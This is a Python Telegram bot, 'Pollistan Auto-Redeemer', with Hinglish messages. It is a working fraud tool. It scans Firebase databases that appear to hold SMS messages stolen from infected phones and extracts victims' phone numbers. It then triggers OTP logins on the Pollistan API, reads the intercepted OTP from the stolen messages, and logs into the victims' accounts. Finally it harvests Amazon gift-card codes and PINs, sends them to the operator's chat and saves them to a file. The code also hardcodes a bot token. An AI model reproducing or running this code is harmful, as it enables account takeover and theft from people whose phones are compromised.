import telebot
from telebot import types
import threading
import time
import os
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─────────────────────────────────────────────
# TELEGRAM BOT CONFIG
# ─────────────────────────────────────────────
BOT_TOKEN = "8610331125:AAGUK153olw3zFf-QUdwMzhwiUFVp5U9OOA"
ADMIN_CHAT_ID = 8083076438  # Your Authorized User ID

bot = telebot.TeleBot(BOT_TOKEN)

API_BASE = "https://api.pollistan.com/api/v1"
FIREBASE_FILE = "l.txt"
VOUCHER_FILE = "vouchers.txt"
FAILED_FILE = "failed.txt"
TIMEOUT = 10
DEFAULT_WORKERS = 100

is_running = False
stats_lock = threading.Lock()
stats = {"ok": 0, "fail": 0, "total": 0}

# Temporary state for user inputs (Adding/Removing Firebase)
user_states = {}

def is_authorized(chat_id):
    return chat_id == ADMIN_CHAT_ID

# ─────────────────────────────────────────────
# KEYBOARD BUTTONS
# ─────────────────────────────────────────────
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_run = types.KeyboardButton("🚀 Run Redeemer")
    btn_status = types.KeyboardButton("📊 Status")
    btn_vouchers = types.KeyboardButton("🎁 View Vouchers")
    btn_add = types.KeyboardButton("➕ Add Firebase")
    btn_remove = types.KeyboardButton("🗑️ Remove Firebase")
    btn_list = types.KeyboardButton("📋 List Firebase")
    markup.add(btn_run, btn_status, btn_vouchers, btn_add, btn_remove, btn_list)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "❌ You are not authorized to use this bot.")
        return

    bot.send_message(
        message.chat.id,
        "👑 *Pollistan Auto-Redeemer Bot*\n\nNeeche diye gaye buttons ka use karein:",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    if not is_authorized(message.chat.id):
        return

    global is_running, user_states
    text = message.text
    chat_id = message.chat.id

    # Check if user is in an active input state
    state = user_states.get(chat_id)
    if state == "WAITING_FOR_ADD":
        user_states[chat_id] = None
        new_link = text.strip()
        if "firebaseio.com" in new_link or "firebasedatabase.app" in new_link:
            with open(FIREBASE_FILE, "a", encoding="utf-8") as f:
                f.write(f"\n{new_link}")
            bot.send_message(chat_id, "✅ Firebase link successfully add ho gaya `l.txt` mein!", reply_markup=main_keyboard())
        else:
            bot.send_message(chat_id, "❌ Invalid Firebase URL format!", reply_markup=main_keyboard())
        return

    elif state == "WAITING_FOR_REMOVE":
        user_states[chat_id] = None
        target = text.strip()
        if not os.path.exists(FIREBASE_FILE):
            bot.send_message(chat_id, "❌ `l.txt` file nahi mili.", reply_markup=main_keyboard())
            return

        with open(FIREBASE_FILE, "r", encoding="utf-8") as f:
            lines = f.readlines()

        new_lines = []
        removed = False
        for line in lines:
            if target not in line:
                new_lines.append(line)
            else:
                removed = True

        if removed:
            with open(FIREBASE_FILE, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
            bot.send_message(chat_id, f"✅ Firebase link successfully remove kar diya gaya!", reply_markup=main_keyboard())
        else:
            bot.send_message(chat_id, "⚠️ Wo link `l.txt` mein nahi mila.", reply_markup=main_keyboard())
        return

    # Normal Button Actions
    if text == "🚀 Run Redeemer":
        if is_running:
            bot.send_message(chat_id, "⚠️ Redeemer pehle se hi chal raha hai!", reply_markup=main_keyboard())
            return
        
        bot.send_message(chat_id, "⚡ Redeemer start ho gaya hai...", reply_markup=main_keyboard())
        threading.Thread(target=run_redeemer_task, args=(chat_id,)).start()

    elif text == "📊 Status":
        status_msg = (
            f"📊 *Live Stats*\n"
            f"• Status: {'Running 🟢' if is_running else 'Idle ⚪'}\n"
            f"• Success (✅): {stats['ok']}\n"
            f"• Failed (❌): {stats['fail']}\n"
            f"• Total Processed: {stats['total']}"
        )
        bot.send_message(chat_id, status_msg, parse_mode="Markdown", reply_markup=main_keyboard())

    elif text == "🎁 View Vouchers":
        if os.path.exists(VOUCHER_FILE):
            with open(VOUCHER_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            if len(content.strip()) > 0:
                if len(content) > 4000:
                    bot.send_document(chat_id, open(VOUCHER_FILE, "rb"))
                else:
                    bot.send_message(chat_id, f"```\n{content}\n```", parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "📂 Vouchers file khaali hai.")
        else:
            bot.send_message(chat_id, "📂 Abhi tak koi voucher nahi mila.")

    elif text == "➕ Add Firebase":
        user_states[chat_id] = "WAITING_FOR_ADD"
        bot.send_message(chat_id, "📥 Ab naya Firebase link ya URL bhejein jise add karna hai:")

    elif text == "🗑️ Remove Firebase":
        user_states[chat_id] = "WAITING_FOR_REMOVE"
        bot.send_message(chat_id, "🗑️ Wo link ya uska text bhejein jise remove karna hai:")

    elif text == "📋 List Firebase":
        if os.path.exists(FIREBASE_FILE):
            with open(FIREBASE_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            if len(content.strip()) > 0:
                if len(content) > 4000:
                    bot.send_document(chat_id, open(FIREBASE_FILE, "rb"))
                else:
                    bot.send_message(chat_id, f"📋 *Firebase Links (`l.txt`):*\n```\n{content}\n```", parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "📂 `l.txt` file khaali hai.")
        else:
            bot.send_message(chat_id, "❌ `l.txt` file nahi mili.")

# ─────────────────────────────────────────────
# REDEEMER BACKGROUND LOGIC
# ─────────────────────────────────────────────
def parse_firebase_link(link):
    link = link.strip()
    if link.startswith(("http://","https://")) and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        return link.rstrip("/") + "/"
    return None

def is_online_device(data):
    if not isinstance(data, dict):
        return False
    for key in ("status","state","online","isOnline","connected","isConnected"):
        value = data.get(key)
        if value is True or value == 1 or (isinstance(value, str) and value.lower() in {"true","online","connected","active"}):
            return True
    return False

def extract_phone_from_messages(device_messages):
    import re
    pattern = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
    counts = {}
    for msg in device_messages.values():
        if not isinstance(msg, dict): continue
        text = str(msg.get("body") or msg.get("message") or "")
        for num in pattern.findall(text):
            counts[num] = counts.get(num, 0) + 1
    return max(counts, key=counts.get) if counts else None

def extract_otp_from_messages(device_messages, trigger_time_ms):
    import re
    for msg_id in reversed(list(device_messages.keys())):
        msg_data = device_messages[msg_id]
        if not isinstance(msg_data, dict): continue
        body = str(msg_data.get("body") or msg_data.get("message") or "")
        match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
        if match: return match.group(0)
    return None

def fetch_single_panel(index, total_panels, fb_url):
    try:
        c = requests.get(f"{fb_url.rstrip('/')}/clients.json", timeout=TIMEOUT)
        if c.status_code != 200: return []
        clients = c.json() or {}
        m = requests.get(f"{fb_url.rstrip('/')}/messages.json", timeout=TIMEOUT)
        messages = m.json() or {}
    except Exception:
        return []
    
    if not isinstance(clients, dict): return []
    online = [cid for cid, cdata in clients.items() if is_online_device(cdata)]
    result = []
    seen = set()
    for cid in online:
        dev_msgs = messages.get(str(cid), {}) if isinstance(messages, dict) else {}
        phone = extract_phone_from_messages(dev_msgs)
        if phone and phone not in seen:
            seen.add(phone)
            result.append({"client_id": cid, "phone": phone})
    return result

def run_redeemer_task(chat_id):
    global is_running, stats
    is_running = True
    stats = {"ok": 0, "fail": 0, "total": 0}

    if not os.path.exists(FIREBASE_FILE):
        bot.send_message(chat_id, "❌ `l.txt` file nahi mili!", parse_mode="Markdown")
        is_running = False
        return

    with open(FIREBASE_FILE, encoding="utf-8") as f:
        raw = [l.strip() for l in f if l.strip() and not l.startswith("#")]

    panel_urls = [parse_firebase_link(l.split("|")[0].strip()) for l in raw if parse_firebase_link(l.split("|")[0].strip())]
    
    if not panel_urls:
        bot.send_message(chat_id, "❌ Koi valid Firebase URL nahi mila `l.txt` mein.", parse_mode="Markdown")
        is_running = False
        return

    bot.send_message(chat_id, f"🔍 Scanning {len(panel_urls)} panels concurrently...")
    all_jobs = []
    
    with ThreadPoolExecutor(max_workers=30) as panel_ex:
        futures = {panel_ex.submit(fetch_single_panel, i, len(panel_urls), url): url for i, url in enumerate(panel_urls, 1)}
        for future in as_completed(futures):
            fb_url = futures[future]
            try:
                devices = future.result()
                for dev in devices:
                    all_jobs.append((dev["phone"], fb_url, dev["client_id"]))
            except: pass

    if not all_jobs:
        bot.send_message(chat_id, "⚠️ Koi online devices nahi mile.", parse_mode="Markdown")
        is_running = False
        return

    bot.send_message(chat_id, f"🚀 Total numbers found: {len(all_jobs)}. Processing...")

    def process_number(phone, firebase_url, client_id):
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
            "Content-Type": "application/json",
            "Origin": "https://pollistan.com",
            "Referer": "https://pollistan.com/"
        })
        with stats_lock: stats["total"] += 1

        trigger_ms = int(time.time() * 1000)
        try:
            r = session.post(f"{API_BASE}/auth/send-otp", json={"mobileNumber": f"+91{phone}"}, timeout=TIMEOUT)
            if r.status_code not in (200, 201, 400):
                with stats_lock: stats["fail"] += 1
                return
        except:
            with stats_lock: stats["fail"] += 1
            return

        otp = None
        for _ in range(15):
            time.sleep(3)
            try:
                r = session.get(f"{firebase_url}messages/{client_id}.json", timeout=TIMEOUT)
                msgs = r.json()
                if isinstance(msgs, dict):
                    otp = extract_otp_from_messages(msgs, trigger_time_ms)
                    if otp: break
            except: continue

        if not otp:
            with stats_lock: stats["fail"] += 1
            return

        try:
            r = session.post(f"{API_BASE}/auth/verify-otp", json={"mobileNumber": f"+91{phone}", "otp": otp}, timeout=TIMEOUT)
            if r.status_code not in (200, 201):
                with stats_lock: stats["fail"] += 1
                return
            token = r.json().get("token") or r.json().get("accessToken")
            session.headers.update({"Authorization": f"Bearer {token}"})
        except:
            with stats_lock: stats["fail"] += 1
            return

        time.sleep(1)
        try:
            r = session.get(f"{API_BASE}/gift-cards/my", params={"active": "true"}, timeout=TIMEOUT)
            purchases = r.json() if r.status_code == 200 else []
            if isinstance(purchases, dict):
                purchases = purchases.get("purchases", [])
            
            for item in purchases:
                brand = str(item.get("brandName", "")).lower()
                pid = item.get("purchaseId") or item.get("id")
                if "amazon" in brand and pid:
                    det = session.get(f"{API_BASE}/gift-cards/purchases/{pid}", timeout=TIMEOUT).json()
                    code = det.get("voucherCode") or det.get("code") or ""
                    pin = det.get("voucherPin") or det.get("pin") or "N/A"
                    amt = int(det.get("denominationPaise", 0)) // 100
                    if code:
                        with stats_lock: stats["ok"] += 1
                        msg = f"🎁 *VOUCHER FOUND!*\n📱 Phone: `{phone}`\n🎫 Code: `{code}`\n🔑 PIN: `{pin}`\n💰 Amount: ₹{amt}"
                        bot.send_message(chat_id, msg, parse_mode="Markdown")
                        with open(VOUCHER_FILE, "a", encoding="utf-8") as vf:
                            vf.write(f"{phone} | {code} | {pin} | ₹{amt}\n")
                        return
        except: pass
        with stats_lock: stats["fail"] += 1

    with ThreadPoolExecutor(max_workers=DEFAULT_WORKERS) as ex:
        futures = [ex.submit(process_number, p, f, c) for p, f, c in all_jobs]
        for f in as_completed(futures): pass

    is_running = False
    bot.send_message(chat_id, f"✅ Task Completed!\nSuccess: {stats['ok']} | Failed: {stats['fail']}", reply_markup=main_keyboard())

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
